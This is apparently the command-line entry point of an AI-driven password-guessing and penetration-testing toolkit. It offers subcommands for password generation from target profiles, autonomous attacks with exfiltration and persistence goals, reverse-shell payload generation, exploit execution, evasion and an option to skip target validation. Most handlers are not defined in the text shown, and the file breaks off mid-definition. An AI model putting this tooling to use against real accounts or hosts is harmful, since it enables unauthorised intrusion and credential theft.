"""
Password Guesser - CLI Entry Point

Usage:
    password-guesser train --config config.yaml --data passwords.txt --amp
    password-guesser generate --checkpoint best_model.pt --target "目标信息"
    password-guesser web --port 8000
    password-guesser interactive
    password-guesser evaluate --password "P@ssw0rd"
    password-guesser scan --target 192.168.1.0/24 --type full
    password-guesser attack --target 192.168.1.100 --mode team
    password-guesser wordlist --output wordlist.txt --pattern "company2024"
    password-guesser knowledge --action search --query "CVE-2021-44228"
    password-guesser benchmark --model checkpoints/best_model.pt
    password-guesser config --show
    password-guesser version
    password-guesser crawl https://example.com --depth 3 --vuln_scan
    password-guesser rl --action train --episodes 100
    password-guesser augment --input passwords.txt --output augmented.txt
    password-guesser rules --action list
    password-guesser pcfg --action generate --count 1000
    password-guesser adversarial --mode redblue --rounds 10
    password-guesser sandbox --action status
    password-guesser tools --action list
"""

import os
import sys
import argparse
import json
import hashlib
import base64
import platform
import socket
import struct
import time
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def cmd_train(args):
    """Run training"""
    from train import main as train_main
    sys.argv = [
        "train.py",
        "--config", args.config,
        "--data", args.data,
        "--epochs", str(args.epochs),
        "--batch_size", str(args.batch_size),
        "--lr", str(args.lr),
        "--output", args.output,
        "--warmup_steps", str(args.warmup_steps),
        "--gradient_accumulation_steps", str(args.grad_accum),
    ]
    if args.amp:
        sys.argv.append("--amp")
    if args.scheduler:
        sys.argv.extend(["--scheduler", args.scheduler])
    if args.gradient_checkpointing:
        sys.argv.append("--gradient_checkpointing")
    if args.early_stopping:
        sys.argv.extend(["--early_stopping_patience", str(args.early_stopping)])
    if args.resume:
        sys.argv.extend(["--resume", args.resume])

    train_main()


def cmd_generate(args):
    """Run password generation"""
    import torch
    import yaml
    from models import MambaPasswordModel, MambaConfig, MLPEncoder, LLMInfoExtractor
    from utils import PasswordTokenizer
    from utils.feature_utils import TargetFeatures

    # Load config
    with open(args.config, 'r') as f:
        config = yaml.safe_load(f)

    # Load model
    print(f"Loading model from {args.checkpoint}...")
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")

    model_config = MambaConfig()
    model = MambaPasswordModel(model_config)
    mlp_encoder = MLPEncoder(input_dim=64, hidden_dims=[128, 128], output_dim=128)

    checkpoint = torch.load(args.checkpoint, map_location=device)
    model.load_state_dict(checkpoint['model_state_dict'])
    mlp_encoder.load_state_dict(checkpoint['mlp_state_dict'])
    model = model.to(device).eval()
    mlp_encoder = mlp_encoder.to(device).eval()

    tokenizer = PasswordTokenizer()

    # Read target info
    if args.target_file:
        with open(args.target_file, 'r', encoding='utf-8') as f:
            target_text = f.read()
    else:
        target_text = args.text or ""

    # Extract features
    features = None
    if target_text and config.get('llm', {}).get('api_key'):
        print("Extracting features with LLM...")
        extractor = LLMInfoExtractor(config_path=args.config)
        features = extractor.extract_multistage(target_text, stages=3, verbose=True)

    # Generate passwords
    print(f"\nGenerating {args.n_samples} passwords using {args.method}...")
    latent = torch.randn(1, 64, device=device)

    with torch.no_grad():
        if args.method == "beam":
            results = model.generate_beam_search(latent, tokenizer, beam_width=args.beam_width)
            for pwd, score in results[:args.n_samples]:
                print(f"  {pwd}  (score: {score:.4f})")
        elif args.method == "diverse_beam":
            results = model.generate_diverse_beam(latent, tokenizer, num_groups=3)
            for pwd, score in results[:args.n_samples]:
                print(f"  {pwd}  (score: {score:.4f})")
        elif args.method == "typical":
            for _ in range(args.n_samples):
                pwd = model.generate_typical(latent, tokenizer)
                print(f"  {pwd}")
        elif args.method == "contrastive":
            for _ in range(args.n_samples):
                pwd = model.generate_contrastive(latent, tokenizer)
                print(f"  {pwd}")
        else:
            for _ in range(args.n_samples):
                pwd = model.generate(latent, tokenizer, temperature=args.temperature)
                print(f"  {pwd}")

    print(f"\nDone! Generated {args.n_samples} passwords.")


def cmd_web(args):
    """Start web server"""
    import uvicorn
    from web.app import app

    print(f"Starting web server on http://0.0.0.0:{args.port}")
    uvicorn.run(app, host=args.host, port=args.port, reload=args.reload)


def cmd_pentest(args):
    """Run penetration test"""
    import json
    from pentest.orchestrator import PenTestOrchestrator, PenTestConfig
    from models.llm_provider import LLMConfig

    # Load targets
    if args.target_file:
        with open(args.target_file, 'r', encoding='utf-8') as f:
            targets = json.load(f)
    elif args.targets:
        targets = json.loads(args.targets)
    else:
        print("Error: Please provide --targets or --target_file")
        return

    # Create config
    config = PenTestConfig(
        max_steps=args.max_steps,
        auto_mode=not args.interactive,
        reflection_frequency=args.reflection_freq,
        enable_attack_team=getattr(args, 'team', False),
        enable_self_improvement=not getattr(args, 'no_self_improvement', False),
    )

    # Add LLM config if provided
    if args.llm_api_key:
        config.llm_config = LLMConfig(
            provider=args.llm_provider,
            api_key=args.llm_api_key,
            api_base=args.llm_api_base,
            model=args.llm_model,
        )

    # Create orchestrator
    orch = PenTestOrchestrator(config)

    # Initialize from targets
    orch.initialize_from_scan({
        "format": "manual",
        "data": targets if isinstance(targets, list) else [targets],
    })

    print(f"\nStarting penetration test...")
    print(f"  Targets: {len(targets)}")
    print(f"  Goal: {args.goal}")
    print(f"  Max steps: {args.max_steps}")
    print(f"  Mode: {'Interactive' if args.interactive else 'Autonomous'}")
    print()

    if args.interactive:
        orch.run_interactive()
    elif getattr(args, 'team', False):
        print("  Mode: Team-based")
        results = orch.run_team_based(
            target_goal=args.goal,
            max_steps=args.max_steps,
            verbose=True,
        )
    else:
        results = orch.run_autonomous(
            target_goal=args.goal,
            max_steps=args.max_steps,
            verbose=True,
        )

        print(f"\n{'='*60}")
        print("PENETRATION TEST COMPLETE")
        print(f"{'='*60}")
        print(results["summary"])

        # Save report
        if args.output:
            from pentest.report import PenTestReport, PenTestSession
            session = PenTestSession(
                target_goal=results.get("goal", ""),
                total_steps=results.get("total_steps", 0),
                total_reward=results.get("total_reward", 0),
                duration=results.get("duration", 0),
                state=results.get("state", {}),
                steps=results.get("steps", []),
                attack_graph=results.get("attack_graph", {}),
                knowledge_stats=results.get("knowledge_stats", {}),
                reflections_count=results.get("reflection_count", 0),
            )
            report = PenTestReport()

            output_path = args.output
            if output_path.endswith('.json'):
                with open(output_path, 'w') as f:
                    json.dump(report.generate_json(session), f, indent=2)
            elif output_path.endswith('.md'):
                with open(output_path, 'w') as f:
                    f.write(report.generate_markdown(session))
            else:
                with open(output_path + '.json', 'w') as f:
                    json.dump(report.generate_json(session), f, indent=2)

            print(f"Report saved to {args.output}")


def main():
    parser = argparse.ArgumentParser(
        prog="password-guesser",
        description="AI-powered targeted password guessing system",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  password-guesser train --data passwords.txt --epochs 50 --amp
  password-guesser generate --checkpoint best_model.pt --method beam
  password-guesser evaluate --password "P@ssw0rd!" --detailed
  password-guesser scan --target 192.168.1.0/24 --type full
  password-guesser attack --target 192.168.1.100 --mode team
  password-guesser wordlist --output dict.txt --pattern "@@@2024" --count 1000
  password-guesser knowledge --action search --query "Log4Shell"
  password-guesser hash --text "hello world"
  password-guesser encode --text "secret" --method base64
  password-guesser benchmark --model checkpoints/best_model.pt --iterations 100
  password-guesser config --show
  password-guesser interactive
  password-guesser version
  password-guesser network --action ping --target 192.168.1.1
  password-guesser crypt --action encrypt --text "secret" --algorithm aes-256
  password-guesser api --action get --url https://api.example.com/users
  password-guesser hashcat --action detect --hash "e10adc3949ba59abbe56e057f20f883e"
  password-guesser fuzz --action web --url http://target.com/FUZZ
  password-guesser db --action enum --target 192.168.1.100 --type mysql

Available subcommands:
  train          Train the MAMBA password model
  generate       Generate password candidates
  web            Start web interface
  pentest        Run penetration test
  status         Show system status
  interactive    Launch kali-style interactive terminal
  evaluate       Evaluate password strength
  scan           Network scanning/reconnaissance
  attack         Launch attack mode (auto/team/interactive)
  wordlist       Generate wordlists
  knowledge      Knowledge base operations
  benchmark      Run performance benchmarks
  config         Configuration management
  hash           Calculate hash values
  encode         Encode/decode text
  report         Generate pentest report
  version        Show version info
  crawl          Web crawler for reconnaissance
  rl             Reinforcement learning operations
  augment        Password data augmentation
  rules          Password rules operations
  sandbox        Sandbox execution for tools
  adversarial    Red/blue team simulation
  pcfg           PCFG password generation
  tools          Penetration testing tools management
  exploit        Search and run exploits
  payload        Generate payloads (reverse/bind shells)
  session        Active session management
  dns            DNS enumeration
  osint          OSINT intelligence gathering
  analyze        AI-powered vulnerability analysis
  llm            Direct LLM interaction
  graph          Attack graph visualization/export
  evasion        Evasion technique management
  scope          Authorization scope management
  lessons        Lessons learned database
  reverse-shell  Reverse shell payload generator
  listener       Listener management
  network        Network utilities (ping/traceroute/resolve/portcheck)
  crypt          Cryptographic tools (encrypt/decrypt/keygen/sslcheck)
  api            API testing utilities (get/post/fuzz/auth)
  hashcat        Hash cracking with hashcat integration
  stego          Steganography tools (hide/extract/analyze)
  fuzz           Fuzzing utilities (web/param/header/path)
  wifi           WiFi security analysis
  db             Database security tools
  log            Log analysis tools
  debug          Debug and diagnostics tools
  profile        Performance profiling
  env            Environment and workspace management
  pkg            Package and tool management
  script         Script execution and replay
  data           Data import/export/convert utilities
  output         Output formatting (table/json/csv/markdown/html)
  chart          Generate charts and visualizations (bar/line/pie/heatmap)
  export         Export reports with embedded charts (PNG/SVG/PDF/HTML/DOCX)
  pipeline       Execute command pipelines (R's %>% equivalent)
  flamegraph     Generate performance flamegraphs
  demo           Run built-in demonstrations
  doc            Documentation and help system
  help           Show help for commands (with examples)
""")

    # Global options
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output (DEBUG level)")
    parser.add_argument("--quiet", "-q", action="store_true", help="Quiet output (WARNING level)")
    parser.add_argument("--config", default="config.yaml", help="Global config file")

    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # --- train ---
    train_parser = subparsers.add_parser("train", help="Train the model")
    train_parser.add_argument("--config", default="config.yaml", help="Config file")
    train_parser.add_argument("--data", required=True, help="Password data file")
    train_parser.add_argument("--epochs", type=int, default=100, help="Number of epochs")
    train_parser.add_argument("--batch_size", type=int, default=64, help="Batch size")
    train_parser.add_argument("--lr", type=float, default=0.001, help="Learning rate")
    train_parser.add_argument("--output", default="checkpoints", help="Output directory")
    train_parser.add_argument("--amp", action="store_true", help="Enable mixed precision")
    train_parser.add_argument("--warmup_steps", type=int, default=1000, help="Warmup steps")
    train_parser.add_argument("--grad_accum", type=int, default=1, help="Gradient accumulation")
    train_parser.add_argument("--scheduler", choices=["cosine", "onecycle"], default="cosine")
    train_parser.add_argument("--gradient_checkpointing", action="store_true")
    train_parser.add_argument("--early_stopping", type=int, default=10, help="Early stopping patience")
    train_parser.add_argument("--resume", default=None, help="Resume from checkpoint")
    train_parser.set_defaults(func=cmd_train)

    # --- generate ---
    gen_parser = subparsers.add_parser("generate", help="Generate password candidates")
    gen_parser.add_argument("--config", default="config.yaml", help="Config file")
    gen_parser.add_argument("--checkpoint", required=True, help="Model checkpoint path")
    gen_parser.add_argument("--text", default=None, help="Target information text")
    gen_parser.add_argument("--target_file", default=None, help="Target information file")
    gen_parser.add_argument("--method", default="sampling",
                           choices=["sampling", "beam", "diverse_beam", "typical", "contrastive"])
    gen_parser.add_argument("--n_samples", type=int, default=20, help="Number of samples")
    gen_parser.add_argument("--temperature", type=float, default=1.0)
    gen_parser.add_argument("--beam_width", type=int, default=5)
    gen_parser.set_defaults(func=cmd_generate)

    # --- web ---
    web_parser = subparsers.add_parser("web", help="Start web interface")
    web_parser.add_argument("--host", default="0.0.0.0", help="Host")
    web_parser.add_argument("--port", type=int, default=8000, help="Port")
    web_parser.add_argument("--reload", action="store_true", help="Enable auto-reload")
    web_parser.set_defaults(func=cmd_web)

    # --- pentest ---
    pt_parser = subparsers.add_parser("pentest", help="Run penetration test")
    pt_parser.add_argument("--targets", default=None, help="Target JSON string")
    pt_parser.add_argument("--target_file", default=None, help="Target JSON file")
    pt_parser.add_argument("--goal", default="full_compromise",
                           choices=["full_compromise", "get_shell", "escalate_priv", "exfiltrate_data"])
    pt_parser.add_argument("--max_steps", type=int, default=50)
    pt_parser.add_argument("--interactive", action="store_true", help="Interactive mode")
    pt_parser.add_argument("--reflection_freq", type=int, default=5)
    pt_parser.add_argument("--output", default=None, help="Save report to file")
    pt_parser.add_argument("--llm_provider", default="deepseek")
    pt_parser.add_argument("--llm_api_key", default=None)
    pt_parser.add_argument("--llm_api_base", default="https://api.deepseek.com/v1")
    pt_parser.add_argument("--llm_model", default="deepseek-chat")
    pt_parser.add_argument("--team", action="store_true", help="Use team-based mode")
    pt_parser.add_argument("--no_self_improvement", action="store_true", help="Disable self-improvement")
    pt_parser.set_defaults(func=cmd_pentest)

    # --- status ---
    status_parser = subparsers.add_parser("status", help="Show system status")
    status_parser.set_defaults(func=cmd_status)

    # --- interactive ---
    interactive_parser = subparsers.add_parser("interactive", aliases=["shell", "kali"],
                                               help="Launch kali-style interactive terminal")
    interactive_parser.set_defaults(func=cmd_interactive)

    # --- evaluate ---
    eval_parser = subparsers.add_parser("evaluate", aliases=["check"], help="Evaluate password strength")
    eval_parser.add_argument("--password", "-p", default=None, help="Password to evaluate")
    eval_parser.add_argument("--detailed", "-d", action="store_true", help="Show detailed analysis")
    eval_parser.add_argument("--check_leak", action="store_true", help="Check against known leaks")
    eval_parser.set_defaults(func=cmd_evaluate)

    # --- scan ---
    scan_parser = subparsers.add_parser("scan", help="Network scanning/reconnaissance")
    scan_parser.add_argument("--target", "-t", required=True, help="Target (IP/CIDR/domain)")
    scan_parser.add_argument("--type", default="full", choices=["full", "port", "service", "vuln", "os", "aggressive", "stealth"],
                            help="Scan type")
    scan_parser.add_argument("--ports", default="1-1000", help="Port range (e.g., 1-65535, or comma-separated)")
    scan_parser.add_argument("--output", "-o", default=None, help="Output file")
    scan_parser.add_argument("--format", "-f", default="console",
                           choices=["console", "json", "xml", "nmap", "csv"],
                           help="Output format")
    scan_parser.add_argument("--timeout", type=int, default=30, help="Timeout in seconds")
    scan_parser.add_argument("--fast", action="store_true", help="Fast scan (ping only)")
    scan_parser.add_argument("--aggressive", action="store_true", help="Aggressive scan (detailed version detection)")
    scan_parser.add_argument("--stealth", action="store_true", help="Stealth mode (lower timing, no ping)")
    scan_parser.add_argument("--detect_os", action="store_true", help="OS detection")
    scan_parser.add_argument("--service_version", action="store_true", help="Service version detection")
    scan_parser.add_argument("--script", "-s", default=None, help="NSE script(s) to run")
    scan_parser.set_defaults(func=cmd_scan)

    # --- attack ---
    attack_parser = subparsers.add_parser("attack", help="Launch attack mode")
    attack_parser.add_argument("--target", "-t", required=True, help="Target host")
    attack_parser.add_argument("--mode", "-m", default="auto",
                              choices=["auto", "team", "interactive", "stealth", "aggressive"],
                              help="Attack mode")
    attack_parser.add_argument("--goal", default="full_compromise",
                              choices=["full_compromise", "get_shell", "escalate_priv", "exfiltrate_data", "persistence", "recon"])
    attack_parser.add_argument("--max_steps", type=int, default=50)
    attack_parser.add_argument("--llm_api_key", default=None, help="LLM API key")
    attack_parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    attack_parser.add_argument("--timeout", type=int, default=300, help="Overall timeout")
    attack_parser.add_argument("--report", default=None, help="Generate report file after attack")
    attack_parser.add_argument("--no_validation", action="store_true", help="Skip target validation")
    attack_parser.set_defaults(func=cmd_attack)

    # --- wordlist ---
    wl_parser = subparsers.add_parser("wordlist", help="Generate wordlists")
    wl_parser.add_argument("--output", "-o", required=True, help="Output file path")
    wl_parser.add_argument("--pattern", default=None, help="Pattern (@=letter, 0=digit, #=special)")
    wl_parser.add_argument("--method", default="hybrid",
                          choices=["pattern", "rules", "markov", "pcfg", "hybrid", "ai", "targeted"],
                          help="Generation method")
    wl_parser.add_argument("--count", "-n", type=int, default=1000, help="Number of passwords")
    wl_parser.add_argument("--base_words", nargs="*", default=None, help="Base words for rules method")
    wl_parser.add_argument("--min_length", type=int, default=6, help="Minimum password length")
    wl_parser.add_argument("--max_length", type=int, default=16, help="Maximum password length")
    wl_parser.add_argument("--charset", default=None, help="Custom character set")
    wl_parser.add_argument("--rules_file", default=None, help="Rules file for hashcat")
    wl_parser.add_argument("--years", nargs="*", type=int, default=[2024, 2025], help="Years to append")
    wl_parser.add_argument("--leet", action="store_true", help="Enable leet speak variations")
    wl_parser.add_argument("--append_numbers", action="store_true", default=True, help="Append numbers")
    wl_parser.add_argument("--append_specials", action="store_true", help="Append special characters")
    wl_parser.add_argument("--target_info", default=None, help="Target info file for AI/targeted generation")
    wl_parser.set_defaults(func=cmd_wordlist)
    wl_parser.set_defaults(func=cmd_wordlist)

    # --- knowledge ---
    kb_parser = subparsers.add_parser("knowledge", help="Knowledge base operations")
    kb_parser.add_argument("--action", "-a", required=True,
                          choices=["search", "cve", "technique", "stats", "import", "export"],
                          help="Action to perform")
    kb_parser.add_argument("--query", "-q", default=None, help="Search query")
    kb_parser.add_argument("--cve_id", default=None, help="CVE ID (e.g., CVE-2021-44228)")
    kb_parser.add_argument("--technique_id", default=None, help="ATT&CK technique ID (e.g., T1190)")
    kb_parser.add_argument("--file", "-f", default=None, help="Import/export file")
    kb_parser.add_argument("--format", default="json", choices=["json", "csv", "markdown"],
                          help="Export format")
    kb_parser.set_defaults(func=cmd_knowledge)

    # --- benchmark ---
    bench_parser = subparsers.add_parser("benchmark", help="Run performance benchmarks")
    bench_parser.add_argument("--model", "-m", default=None, help="Model checkpoint")
    bench_parser.add_argument("--type", "-t", default="all", choices=["all", "inference", "generation", "accuracy"],
                             help="Benchmark type")
    bench_parser.add_argument("--iterations", "-n", type=int, default=100, help="Number of iterations")
    bench_parser.set_defaults(func=cmd_benchmark)

    # --- config ---
    cfg_parser = subparsers.add_parser("config", help="Configuration management")
    cfg_parser.add_argument("--show", "-s", action="store_true", help="Show configuration")
    cfg_parser.add_argument("--action", "-a", default="show",
                          choices=["show", "set", "get", "init"],
                          help="Config action")
    cfg_parser.add_argument("--key", "-k", default=None, help="Config key (dot notation, e.g., llm.api_key)")
    cfg_parser.add_argument("--value", "-V", default=None, help="Config value (for set action)")
    cfg_parser.set_defaults(func=cmd_config)

    # --- hash ---
    hash_parser = subparsers.add_parser("hash", help="Calculate hash values")
    hash_parser.add_argument("--text", "-t", default=None, help="Text to hash")
    hash_parser.add_argument("--file", "-f", default=None, help="File to hash")
    hash_parser.add_argument("--algorithm", "-a", default="all",
                            choices=["all", "md5", "sha1", "sha256", "sha384", "sha512", "blake2b", "blake2s", "ntlm"],
                            help="Hash algorithm")
    hash_parser.add_argument("--compare", "-c", default=None, help="Hash to compare against")
    hash_parser.set_defaults(func=cmd_hash)

    # --- encode ---
    enc_parser = subparsers.add_parser("encode", help="Encode/decode text")
    enc_parser.add_argument("--text", "-t", required=True, help="Text to encode/decode")
    enc_parser.add_argument("--method", "-m", default="all",
                          choices=["base64", "hex", "url", "html", "all"],
                          help="Encoding method")
    enc_parser.add_argument("--decode", "-d", action="store_true", help="Decode instead of encode")
    enc_parser.set_defaults(func=cmd_encode)

    # --- report ---
    report_parser = subparsers.add_parser("report", help="Generate pentest report")
    report_parser.add_argument("--session", "-s", required=True, help="Session JSON file")
    report_parser.add_argument("--output", "-o", required=True, help="Output file path")
    report_parser.add_argument("--format", "-f", default="markdown",
                              choices=["json", "markdown", "md", "html", "pdf", "pptx"],
                              help="Report format")
    report_parser.add_argument("--include-charts", action="store_true", help="Embed charts in report")
    report_parser.add_argument("--include-graph", action="store_true", help="Embed attack graph")
    report_parser.add_argument("--chart-type", default="bar",
                              choices=["bar", "pie", "line", "radar"],
                              help="Chart type for embedded charts")
    report_parser.add_argument("--template", default="default",
                              choices=["default", "executive", "technical", "compliance"],
                              help="Report template")
    report_parser.set_defaults(func=cmd_report)

    # --- version ---
    version_parser = subparsers.add_parser("version", help="Show version info")
    version_parser.set_defaults(func=cmd_version)

    # --- crawl ---
    crawl_parser = subparsers.add_parser("crawl", help="Web crawler for reconnaissance")
    crawl_parser.add_argument("url", help="Starting URL to crawl")
    crawl_parser.add_argument("--depth", "-d", type=int, default=3, help="Max crawl depth")
    crawl_parser.add_argument("--max_pages", type=int, default=100, help="Max pages to crawl")
    crawl_parser.add_argument("--output", "-o", default=None, help="Output file")
    crawl_parser.add_argument("--format", default="json", choices=["json", "txt"])
    crawl_parser.add_argument("--vuln_scan", action="store_true", help="Enable vulnerability scanning")
    crawl_parser.add_argument("--tech_detect", action="store_true", default=True, help="Enable technology detection")
    crawl_parser.add_argument("--rate_limit", type=float, default=1.0, help="Requests per second")
    crawl_parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    crawl_parser.add_argument("--user_agent", default=None, help="Custom user agent")
    crawl_parser.add_argument("--ignore_robots", action="store_true", help="Ignore robots.txt")
    crawl_parser.set_defaults(func=cmd_crawl)

    # --- rl ---
    rl_parser = subparsers.add_parser("rl", help="Reinforcement learning operations")
    rl_parser.add_argument("--action", "-a", required=True,
                          choices=["train", "evaluate", "export", "stats"],
                          help="RL action")
    rl_parser.add_argument("--episodes", "-e", type=int, default=100, help="Training episodes")
    rl_parser.add_argument("--max_steps", type=int, default=100, help="Max steps per episode")
    rl_parser.add_argument("--batch_size", type=int, default=32, help="Batch size")
    rl_parser.add_argument("--lr", type=float, default=0.0003, help="Learning rate")
    rl_parser.add_argument("--checkpoint", "-c", default=None, help="Checkpoint path")
    rl_parser.add_argument("--checkpoint_dir", default="checkpoints", help="Checkpoint directory")
    rl_parser.add_argument("--checkpoint_freq", type=int, default=10, help="Checkpoint frequency")
    rl_parser.add_argument("--output", "-o", default=None, help="Output file")
    rl_parser.add_argument("--format", default="onnx", choices=["onnx", "torchscript"])
    rl_parser.set_defaults(func=cmd_rl)

    # --- augment ---
    augment_parser = subparsers.add_parser("augment", help="Password data augmentation")
    augment_parser.add_argument("--input", "-i", required=True, help="Input password file")
    augment_parser.add_argument("--output", "-o", required=True, help="Output file")
    augment_parser.add_argument("--max_variants", type=int, default=10, help="Max variants per password")
    augment_parser.add_argument("--methods", nargs="*", default=["all"],
                               choices=["all", "case", "leet", "suffix", "prefix", "reverse", "duplicate"],
                               help="Augmentation methods")
    augment_parser.set_defaults(func=cmd_augment)

    # --- rules ---
    rules_parser = subparsers.add_parser("rules", help="Password rules operations")
    rules_parser.add_argument("--action", "-a", required=True,
                             choices=["apply", "list", "generate", "export"],
                             help="Rules action")
    rules_parser.add_argument("--input", "-i", default=None, help="Input password file")
    rules_parser.add_argument("--output", "-o", default=None, help="Output file")
    rules_parser.add_argument("--rules", "-r", default="all", help="Rules to apply (comma-separated)")
    rules_parser.add_argument("--count", type=int, default=100, help="Number of rules to generate")
    rules_parser.add_argument("--format", "-f", default="hashcat", choices=["hashcat", "john", "custom"],
                             help="Rules format")
    rules_parser.set_defaults(func=cmd_rules)

    # --- sandbox ---
    sandbox_parser = subparsers.add_parser("sandbox", help="Sandbox execution for tools")
    sandbox_parser.add_argument("--action", "-a", required=True,
                               choices=["run", "status", "list", "clean"],
                               help="Sandbox action")
    sandbox_parser.add_argument("--command", "-c", default=None, help="Command to execute")
    sandbox_parser.add_argument("--timeout", "-t", type=int, default=300, help="Timeout in seconds")
    sandbox_parser.add_argument("--sandbox_type", default="subprocess", choices=["docker", "subprocess"])
    sandbox_parser.add_argument("--no_network", action="store_true", help="Disable network access")
    sandbox_parser.set_defaults(func=cmd_sandbox)

    # --- adversarial ---
    adversarial_parser = subparsers.add_parser("adversarial", help="Red/blue team simulation")
    adversarial_parser.add_argument("--mode", "-m", default="redblue", choices=["red", "blue", "redblue"])
    adversarial_parser.add_argument("--target", "-t", default="localhost", help="Target")
    adversarial_parser.add_argument("--rounds", "-r", type=int, default=5, help="Number of rounds")
    adversarial_parser.add_argument("--techniques", nargs="*", default=None, help="Evasion techniques")
    adversarial_parser.set_defaults(func=cmd_adversarial)

    # --- pcfg ---
    pcfg_parser = subparsers.add_parser("pcfg", help="PCFG password generation")
    pcfg_parser.add_argument("--action", "-a", required=True,
                            choices=["train", "generate", "stats"],
                            help="PCFG action")
    pcfg_parser.add_argument("--data", "-d", default=None, help="Training data file")
    pcfg_parser.add_argument("--model", "-m", default=None, help="Model file")
    pcfg_parser.add_argument("--output", "-o", default=None, help="Output file")
    pcfg_parser.add_argument("--count", "-n", type=int, default=100, help="Number to generate")
    pcfg_parser.add_argument("--max_samples", type=int, default=100000, help="Max training samples")
    pcfg_parser.set_defaults(func=cmd_pcfg)

    # --- tools ---
    tools_parser = subparsers.add_parser("tools", help="Penetration testing tools management")
    tools_parser.add_argument("--action", "-a", required=True,
                             choices=["list", "check", "install", "update"],
                             help="Tools action")
    tools_parser.add_argument("--tool", "-t", default=None, help="Specific tool name")
    tools_parser.set_defaults(func=cmd_tools)

    # --- exploit ---
    exploit_parser = subparsers.add_parser("exploit", help="Exploit search and execution")
    exploit_parser.add_argument("--action", "-a", required=True,
                              choices=["search", "info", "run", "check"],
                              help="Exploit action")
    exploit_parser.add_argument("--query", "-q", default=None, help="Search query")
    exploit_parser.add_argument("--cve", default=None, help="CVE ID")
    exploit_parser.add_argument("--target", "-t", default=None, help="Target")
    exploit_parser.add_argument("--exploit", "-e", default=None, help="Exploit name")
    exploit_parser.set_defaults(func=cmd_exploit)

    # --- payload ---
    payload_parser = subparsers.add_parser("payload", help="Generate malicious payloads")
    payload_parser.add_argument("--type", "-t", required=True,
                              choices=["reverse_shell_bash", "reverse_shell_python", "reverse_shell_php",
                                      "reverse_shell_powershell", "reverse_shell_perl", "reverse_shell_netcat",
                                      "reverse_shell_netcat2", "bind_shell_python", "bind_shell_netcat"],
                              help="Payload type")
    payload_parser.add_argument("--lhost", default="127.0.0.1", help="Local host")
    payload_parser.add_argument("--lport", default="4444", help="Local port")
    payload_parser.add_argument("--output", "-o", default=None, help="Output file")
    payload_parser.set_defaults(func=cmd_payload)

    # --- session ---
    session_parser = subparsers.add_parser("session", help="Session management")
    session_parser.add_argument("--action", "-a", required=True,
                              choices=["list", "info", "interact", "kill"],
                              help="Session action")
    session_parser.add_argument("--session_id", "-i", type=int, default=None, help="Session ID")
    session_parser.set_defaults(func=cmd_session)

    # --- dns ---
    dns_parser = subparsers.add_parser("dns", help="DNS enumeration")
    dns_parser.add_argument("domain", help="Domain to enumerate")
    dns_parser.add_argument("--type", "-t", default="all",
                           choices=["all", "A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV"],
                           help="Record type")
    dns_parser.set_defaults(func=cmd_dns)

    # --- osint ---
    osint_parser = subparsers.add_parser("osint", help="OSINT reconnaissance")
    osint_parser.add_argument("--action", "-a", required=True,
                            choices=["email", "domain", "username", "ip", "social"],
                            help="OSINT action")
    osint_parser.add_argument("target", help="Target (domain/email/IP/username)")
    osint_parser.set_defaults(func=cmd_osint)

    # --- analyze ---
    analyze_parser = subparsers.add_parser("analyze", help="AI-powered analysis")
    analyze_parser.add_argument("target", help="Target to analyze")
    analyze_parser.add_argument("--type", "-t", default="vulnerability",
                               choices=["vulnerability", "attack_surface", "threat", "remediation"],
                               help="Analysis type")
    analyze_parser.set_defaults(func=cmd_analyze)

    # --- llm ---
    llm_parser = subparsers.add_parser("llm", help="Direct LLM interaction")
    llm_parser.add_argument("prompt", help="Prompt for LLM")
    llm_parser.set_defaults(func=cmd_llm)

    # --- graph ---
    graph_parser = subparsers.add_parser("graph", help="Attack graph operations")
    graph_parser.add_argument("--action", "-a", required=True,
                             choices=["visualize", "export", "stats"],
                             help="Graph action")
    graph_parser.add_argument("--session", "-s", default=None, help="Session file")
    graph_parser.add_argument("--output", "-o", default=None, help="Output file")
    graph_parser.add_argument("--format", "-f", default="json", choices=["json", "dot", "mermaid"],
                            help="Export format")
    graph_parser.set_defaults(func=cmd_graph)

    # --- evasion ---
    evasion_parser = subparsers.add_parser("evasion", help="Evasion techniques")
    evasion_parser.add_argument("--action", "-a", required=True,
                               choices=["list", "apply", "config"],
                               help="Evasion action")
    evasion_parser.add_argument("--level", "-l", default="medium",
                              choices=["none", "low", "medium", "high", "paranoid"],
                              help="Evasion level")
    evasion_parser.set_defaults(func=cmd_evasion)

    # --- scope ---
    scope_parser = subparsers.add_parser("scope", help="Scope management")
    scope_parser.add_argument("--action", "-a", required=True,
                            choices=["show", "add", "remove", "check"],
                            help="Scope action")
    scope_parser.add_argument("--target", "-t", default=None, help="Target IP/domain")
    scope_parser.set_defaults(func=cmd_scope)

    # --- lessons ---
    lessons_parser = subparsers.add_parser("lessons", help="Lessons learned management")
    lessons_parser.add_argument("--action", "-a", required=True,
                               choices=["list", "show", "export", "import"],
                               help="Lessons action")
    lessons_parser.add_argument("--lesson_id", "-l", default=None, help="Lesson ID")
    lessons_parser.add_argument("--output", "-o", default=None, help="Output file")
    lessons_parser.add_argument("--input", "-f", default=None, help="Input file")
    lessons_parser.set_defaults(func=cmd_lessons)

    # --- reverse-shell ---
    rs_parser = subparsers.add_parser("reverse-shell", help="Reverse shell generator")
    rs_parser.add_argument("--lhost", default="127.0.0.1", help="Local host")
    rs_parser.add_argument("--lport", default="4444", help="Local port")
    rs_parser.add_argument("--type", "-t", default="all",
                          choices=["bash", "bash2", "python", "python3", "perl", "php",
                                  "ruby", "nc", "nc2", "java", "powershell", "all"],
                          help="Shell type")
    rs_parser.add_argument("--encode", action="store_true", help="Also show base64 encoded")
    rs_parser.set_defaults(func=cmd_reverse_shell)

    # --- listener ---
    listener_parser = subparsers.add_parser("listener", help="Listener management")
    listener_parser.add_argument("--action", "-a", required=True,
                                choices=["start", "stop", "list"],
                                help="Listener action")
    listener_parser.add_argument("--lport", type=int, default=4444, help="Port")
    listener_parser.add_argument("--type", default="nc", choices=["nc", "meterpreter", "pwncat"],
                                help="Listener type")
    listener_parser.add_argument("--listener_id", "-i", type=int, default=None, help="Listener ID")
